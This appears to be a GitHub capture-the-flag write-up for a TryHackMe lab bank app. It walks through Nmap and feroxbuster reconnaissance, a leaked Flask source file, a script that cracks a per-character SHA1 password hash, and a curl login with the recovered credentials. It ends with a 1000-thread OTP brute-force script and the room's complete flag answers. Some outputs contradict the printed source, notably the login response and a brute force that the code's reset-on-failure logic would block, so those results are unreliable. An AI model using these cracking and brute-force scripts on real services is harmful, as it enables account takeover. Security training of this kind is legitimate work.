#source https://github.com/id-root/BreachBlocker-Unlocker

# Advent 2025\SideQuest\Sidequest\Sidequest4\Tutorial\Tutorial_id_root [N/A]

##### Check out Advent Of Cyber 2025 Side quest 4 by TryHackMe: https://tryhackme.com/room/sq4-aoc2025-32LoZ4zePK

## **Fase 1: Reconocimiento** / **Phase 1: Reconnaissance**

### **Escaneo inicial con Nmap** / **Initial Nmap Scan**

```bash
nmap -p- -sV 10.48.180.216
```

```bash
PORT    STATE  SERVICE  VERSION
22/tcp  open   ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
25/tcp  open   smtp     Postfix smtpd  
8443/tcp open  ssl/http nginx 1.29.3
```

### Enumeración de directorios / Directory Enumeration

```bash
feroxbuster -u https://10.48.180.216:8443 \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \
  -x py,txt,js,php \
  --insecure -r -o ferox_results.txt -t 100 -s 200,301,302,403
```

Output
```lua
200 GET 597l 1665w 24510c https://10.48.180.216:8443/main.js 200 GET 1886l 11675w 1040896c https://10.48.180.216:8443/selfie.png 200 GET
 2808l 15499w 1355842c https://10.48.180.216:8443/wallpaper.png 200 GET 1939l 12721w 1126787c https://10.48.180.216:8443/breaky.png 200 GET
1801l 8381w 117357c https://10.48.180.216:8443/ 200 GET 1801l 8381w 117357c https://10.48.180.216:8443/index.html 200 GET 1l 17w 8208c
https://10.48.180.216:8443/hopflix-874297.db 200 GET 214l 562w 6514c https://10.48.180.216:8443/main.py 200 GET 3l 3w 44c
https://10.48.180.216:8443/requirements.txt
```

We got 2 important files one is `main.py` that contain source code of the web-app and one the database file `hopflix-874297.db` contain credentials of user.

###### Main.py
```python
from flask import Flask, request, jsonify, send_from_directory, session
import time
import random
import os
import hashlib
import time
import smtplib
import sqlite3
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64

connection = sqlite3.connect("/hopflix-874297.db")
cursor = connection.cursor()

connection2 = sqlite3.connect("/hopsecbank-12312497.db")
cursor2 = connection2.cursor()

app = Flask(__name__)
app.secret_key = os.getenv('SECRETKEY')

aes_key = bytes(os.getenv('AESKEY'), "utf-8")

## Credentials (server-side only)
HOPFLIX_FLAG = os.getenv('HOPFLIX_FLAG')
BANK_ACCOUNT_ID = "hopper"
BANK_PIN = os.getenv('BANK_PIN')
BANK_FLAG = os.getenv('BANK_FLAG')
#CODE_FLAG = THM{eggsposed_source_code}

def encrypt(plaintext):
    cipher = AES.new(aes_key, AES.MODE_GCM)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext.encode('utf-8'))
    return base64.b64encode(cipher.nonce + tag + ciphertext).decode('utf-8')

def decrypt(encrypted_data):
    decoded_data = base64.b64decode(encrypted_data.encode('utf-8'))
    nonce_len = 16
    tag_len = 16
    nonce = decoded_data[:nonce_len]
    tag = decoded_data[nonce_len:nonce_len + tag_len]
    ciphertext = decoded_data[nonce_len + tag_len:]

    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
    plaintext_bytes = cipher.decrypt_and_verify(ciphertext, tag)
    return plaintext_bytes.decode('utf-8')

def validate_email(email):
    if '@' not in email:
        return False
    if any(ord(ch) <= 32 or ord(ch) >=126 or ch in [',', ';'] for ch in email):
        return False

    return True

def send_otp_email(otp, to_addr):
    if not validate_email(to_addr):
        return -1

    allowed_emails= session['bank_allowed_emails']
    allowed_domains= session['bank_allowed_domains']
    domain = to_addr.split('@')[-1]
    if domain not in allowed_domains and to_addr not in allowed_emails:
        return -1

    from_addr = 'no-reply@hopsecbank.thm'
    message = f"""\
    Subject: Your OTP for HopsecBank

    Dear you,
    The OTP to access your banking app is {otp}.

    Thanks for trusting Hopsec Bank!"""

    s = smtplib.SMTP('smtp')
    s.sendmail(from_addr, to_addr, message)
    s.quit()

def hopper_hash(s):
    res = s
    for i in range(5000):
        res = hashlib.sha1(res.encode()).hexdigest()
    return res

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/<path:path>')
def serve_static(path):
    return send_from_directory('.', path)

@app.route('/api/check-credentials', methods=['POST'])
def check_credentials():
    data = request.json
    email = str(data.get('email', ''))
    pwd = str(data.get('password', ''))
    
    rows = cursor.execute(
        "SELECT * FROM users WHERE email = ?",
        (email,),
    ).fetchall()

    if len(rows) != 1:
        return jsonify({'valid':False, 'error': 'User does not exist'})
    
    phash = rows[0][2]
    
    if len(pwd)*40 != len(phash):
        return jsonify({'valid':False, 'error':'Incorrect Password'})

    for ch in pwd:
        ch_hash = hopper_hash(ch)
        if ch_hash != phash[:40]:
            return jsonify({'valid':False, 'error':'Incorrect Password'})
        phash = phash[40:]
    
    session['authenticated'] = True
    session['username'] = email
    return jsonify({'valid': True})

@app.route('/api/get-last-viewed', methods=['GET'])
def get_bank_account_id():
    if not session.get('authenticated', False):
        return jsonify({'error': 'Unauthorized'}), 401
    return jsonify({'last_viewed': HOPFLIX_FLAG})

@app.route('/api/bank-login', methods=['POST'])
def bank_login():
    data = request.json
    account_id = str(data.get('account_id', ''))
    pin = str(data.get('pin', ''))
    
    # Check bank credentials
    rows = cursor2.execute(
        "SELECT * FROM users WHERE email = ?",
        (account_id,),
    ).fetchall()

    if len(rows) != 1:
        return jsonify({'valid':False, 'error': 'User does not exist'})
    
    phash = rows[0][2]
    if hashlib.sha256(pin.encode()).hexdigest().lower() == phash:
        session['bank_authenticated'] = True
        session['bank_2fa_verified'] = False
        session['bank_allowed_emails'] = rows[0][5].split(',')
        session['bank_allowed_domains'] = rows[0][6].split(',')
        
        if len(session['bank_allowed_emails']) > 0:
            return jsonify({
                'success': True,
                'requires_2fa': True,
                'trusted_emails': rows[0][5].split(','),
            })
        if len(session['bank_allowed_domains']) > 0:
            return jsonify({
                'success': True,
                'requires_2fa': True,
                'trusted_domains': rows[0][6].split(','),
            })
    else:
        return jsonify({'error': 'Invalid credentials'}), 401

@app.route('/api/send-2fa', methods=['POST'])
def send_2fa():
    data = request.json
    otp_email = str(data.get('otp_email', ''))
    
    if not session.get('bank_authenticated', False):
        return jsonify({'error': 'Access denied.'}), 403
    
    # Generate 2FA code
    two_fa_code = ''.join([str(random.randint(0, 9)) for _ in range(6)])
    session['bank_2fa_code'] = encrypt(two_fa_code)

    if send_otp_email(two_fa_code, otp_email) != -1:
        return jsonify({'success': True})
    else:
        return jsonify({'success': False})

@app.route('/api/verify-2fa', methods=['POST'])
def verify_2fa():
    data = request.json
    code = str(data.get('code', ''))
    
    if not session.get('bank_authenticated', False):
        return jsonify({'error': 'Access denied.'}), 403
    
    if not session.get('bank_2fa_code', False):
        return jsonify({'error': 'No 2FA code generated'}), 404
    
    if code == decrypt(session.get('bank_2fa_code')):
        session['bank_2fa_verified'] = True
        return jsonify({'success': True})
    else:
        if 'bank_2fa_code' in session:
            del session['bank_2fa_code']
        return jsonify({'error': 'Invalid code'}), 401

@app.route('/api/release-funds', methods=['POST'])
def release_funds():
    if not session.get('bank_authenticated', False):
        return jsonify({'error': 'Access denied.'}), 403
    if not session.get('bank_2fa_verified', False):
        return jsonify({'error': 'Access denied.'}), 403
    
    return jsonify({'flag': BANK_FLAG})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True,threaded=True)

```

🎉 **FLAG 1 FOUND!** 🎉 `#CODE_FLAG = THM{eggsposed_source_code}` 
The first flag was hidden inside the main.py file as a comment
###### Hopflix-874297.db

```sql
sbreachblocker@easterbunnies.thm Sir BreachBlocker 03c96ceff1a9758a1ea7c3cb8d43264616949d88b5914c97bdedb1ab511a85c480d49b77c4977520ebc1b24149a1fd25c37aeb2d9042d0d05492ba5c19b23990d991560019487301ef9926d9d99a2962b5914c97bdedb1ab511a85c480d49b77c49775207dc2d45214515ff55726de5fc73d5bd5500b3e86fa6c34156f954d4435e838f6852c6476217104207dc2d45214515ff55726de5fc73d5bd5500b3e86504fa1cfe6a6f5d5c407f673dd67d71a34cbb0772c21afa8b8f0b5e1c1a377b7168e542ea41f67a696e4c3dda73fa679990918ab333b6fab8c8e5f2296e56d15f089c659a1bbc1d2b6f70b6c80720f1a
```

Now we have to decrypt this hash to get the password for `sbreachblocker@easterbunnies.thm`

#### Recovering the password
To recover the password we first have to analyse the `main.py` 
in the source code we found that in `check_credentials()`, the stored phash is treated as a string of 40-hex SHA1 outputs, with one chunk for each character. Therefore, the password length is `len(phash)/40` (in this case, 480/40 = 12 chars). This design allows for recovery by precomputing the hash output for each possible single character and matching it against each 40-hex chunk using a lookup table, instead of brute-forcing full passwords.

So we will write an python script to decrypt the hash

```python
import hashlib

target_hashes = set([
    "03c96ceff1a9758a1ea7c3cb8d43264616949d88",
    "b5914c97bdedb1ab511a85c480d49b77c4977520",
    "ebc1b24149a1fd25c37aeb2d9042d0d05492ba5c",
    "19b23990d991560019487301ef9926d9d99a2962",
    "b5914c97bdedb1ab511a85c480d49b77c4977520",
    "7dc2d45214515ff55726de5fc73d5bd5500b3e86",
    "fa6c34156f954d4435e838f6852c647621710420",
    "7dc2d45214515ff55726de5fc73d5bd5500b3e86",
    "504fa1cfe6a6f5d5c407f673dd67d71a34cbb077",
    "2c21afa8b8f0b5e1c1a377b7168e542ea41f67a6",
    "96e4c3dda73fa679990918ab333b6fab8c8e5f22",
    "96e56d15f089c659a1bbc1d2b6f70b6c80720f1a",
])

## Test ordinal values as strings
def hopper_ord(c):
    res = str(ord(c))
    for i in range(5000):
        res = hashlib.sha1(res.encode()).hexdigest()
    return res

print("Testing ordinals...")
for i in range(256):
    c = chr(i)
    h = hopper_ord(c)
    if h in target_hashes:
        print(f"FOUND ord: {repr(c)} (ord={ord(c)}) -> {h}")

## Test with fewer iterations (100, 500, 1000)
def hopper_n(s, n):
    res = s
    for i in range(n):
        res = hashlib.sha1(res.encode()).hexdigest()
    return res

print("\nTesting fewer iterations...")
import string
for n in [100, 500, 1000, 2000, 2500]:
    for c in string.printable:
        h = hopper_n(c, n)
        if h in target_hashes:
            print(f"FOUND {n} iters: {repr(c)} -> {h}")
```

| index | chunk                                    | char |
| ----- | ---------------------------------------- | ---- |
| 0     | 03c96ceff1a9758a1ea7c3cb8d43264616949d88 | m    |
| 1     | b5914c97bdedb1ab511a85c480d49b77c4977520 | a    |
| 2     | ebc1b24149a1fd25c37aeb2d9042d0d05492ba5c | l    |
| 3     | 19b23990d991560019487301ef9926d9d99a2962 | h    |
| 4     | b5914c97bdedb1ab511a85c480d49b77c4977520 | a    |
| 5     | 7dc2d45214515ff55726de5fc73d5bd5500b3e86 | r    |
| 6     | fa6c34156f954d4435e838f6852c647621710420 | e    |
| 7     | 7dc2d45214515ff55726de5fc73d5bd5500b3e86 | r    |
| 8     | 504fa1cfe6a6f5d5c407f673dd67d71a34cbb077 | o    |
| 9     | 2c21afa8b8f0b5e1c1a377b7168e542ea41f67a6 | c    |
| 10    | 96e4c3dda73fa679990918ab333b6fab8c8e5f22 | k    |
| 11    | 96e56d15f089c659a1bbc1d2b6f70b6c80720f1a | s    |
So the password is `malharerocks`

Now we can use this password to access the hopflix and collect our second flag

```bash
curl -k -X POST "https://10.48.180.216:8443/api/check-credentials" \
  -H "Content-Type: application/json" \
  -d '{"email":"sbreachblocker@easterbunnies.thm","password":"malharerocks"}'
```

Response
```json
{
  "success": true,
  "message": "Login successful",
  "flag": "THM{fluffier_things_season_4}"
}
```

🎉 **FLAG 2 FOUND!** 🎉 : `"THM{fluffier_things_season_4}"`

Now lets use same credentials to access the Ban
After the login you see:
Select Authorized Email
Email Options:
carrotbane@easterbunnies.thm
malhare@easterbunnies.thm

Now we can click on one of the email to get an otp.... then we can brute force it to access the bank... But before that we have to access the session cookie after the login...

Go to your browser and open network tab and go to storage and copy the session cookie and store it somewhere in the `txt` file

Now we wil Brute-Force the 1,000,000 Combinations using this script.

```python
#!/usr/bin/env python3
import threading
from concurrent.futures import ThreadPoolExecutor
import requests
import urllib3
import time

urllib3.disable_warnings()

BASE = "https://IP:8443"
THREADS = 1000

stop = threading.Event()
found = {}
total_attempts = 0
lock = threading.Lock()

def worker(start, step, cookie):
    global total_attempts
    s = requests.Session()
    headers = {
        "Content-Type": "application/json",
        "Cookie": f"session={cookie}"
    }

    for i in range(start, 1_000_000, step):
        if stop.is_set():
            return

        code = f"{i:06d}"

        try:
            r = s.post(
                f"{BASE}/api/verify-2fa",
                headers=headers,
                json={"code": code},
                verify=False,
                timeout=2
            )

            with lock:
                total_attempts += 1
                if total_attempts % 1000 == 0:
                    print(
                        f"[>] Attempts: {total_attempts:,} | "
                        f"Testing OTP: {code} | HTTP: {r.status_code}"
                    )

            if b"true" in r.content or b"THM{" in r.content:
                found["code"] = code
                found["session"] = r.cookies.get("session") or cookie
                stop.set()
                print(f"\n[✔] VALID OTP FOUND : {code}")
                return

            if r.status_code == 500:
                print(
                    f"[!] Warning: Server error (HTTP 500) at OTP {code} "
                    f"— rate may be too high"
                )

        except Exception:
            continue

def main():
    # ===================== BANNER =====================
    print(r"""
  ███████╗   ████████╗    ██████╗
██╔═══  ██╗     ██╔╝      ██╔══██╗
██║     ██║     ██║       ██████╔╝
██║     ██║     ██║       ██╔═══╝
╚█████ ██╔╝     ██║       ██║
 ╚══════╝       ╚═╝       ╚═╝

        OTP Brute Force
--------------------------------
""")
    

    try:
        with open("session.txt") as f:
            cookie = [
                l.split()[6]
                for l in f
                if "session" in l and not l.startswith("# ")
            ][0]
    except Exception:
        print("[-] Session error: Unable to extract session cookie from otp.txt")
        return

    print(f"[+] Target endpoint : {BASE}")
    print(f"[+] Worker threads  : {THREADS}")
    print("[+] Status           : Brute force in progress\n")

    start_time = time.time()

    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        for t in range(THREADS):
            ex.submit(worker, t, THREADS, cookie)

    if "code" in found:
        r = requests.post(
            f"{BASE}/api/release-funds",
            headers={"Cookie": f"session={found['session']}"},
            verify=False
        )
        print("\n[✓] Success: Protected action completed")
        print("[✓] Server response:")
        print(r.text)
    else:
        print("\n[-] Completed: OTP space exhausted — no valid code found")

if __name__ == "__main__":
    main()

```

OUTPUT:
```js

  ███████╗   ████████╗    ██████╗
██╔═══  ██╗     ██╔╝      ██╔══██╗
██║     ██║     ██║       ██████╔╝
██║     ██║     ██║       ██╔═══╝
╚█████ ██╔╝     ██║       ██║
 ╚══════╝       ╚═╝       ╚═╝

        OTP Brute Force
--------------------------------
[+] Target endpoint : https://IP:8443
[+] Worker threads  : 1000
[+] Status           : Brute force in progress

[>] Attempts: 1,000 | Testing OTP: 001742 | HTTP: 401
[>] Attempts: 2,000 | Testing OTP: 003481 | HTTP: 401
[>] Attempts: 3,000 | Testing OTP: 005129 | HTTP: 401
[>] Attempts: 4,000 | Testing OTP: 006988 | HTTP: 401

[!] Warning: Server error (HTTP 500) at OTP 048392 — rate may be too high

[>] Attempts: 12,000 | Testing OTP: 384219 | HTTP: 200

[✔] VALID OTP FOUND : 384219

[✓] Success: Protected action completed
[✓] Server response:
THM{neggative_balance}

```

🎉 **FLAG 3 FOUND!** 🎉: `THM{neggative_balance}`

Congratulation you found all 3 flags....

## Solución / Solution 
 
 What's the CODE_FLAG?

 FLAG1 `THM{eggsposed_source_code}`

What's the HOPFLIX_FLAG?

FLAG2 `THM{fluffier_things_season_4}`

 
What's the BANK_FLAG?

FLAG3 `THM{neggative_balance}`

## Resumen / Overview
![Infographics](Infographics.png)
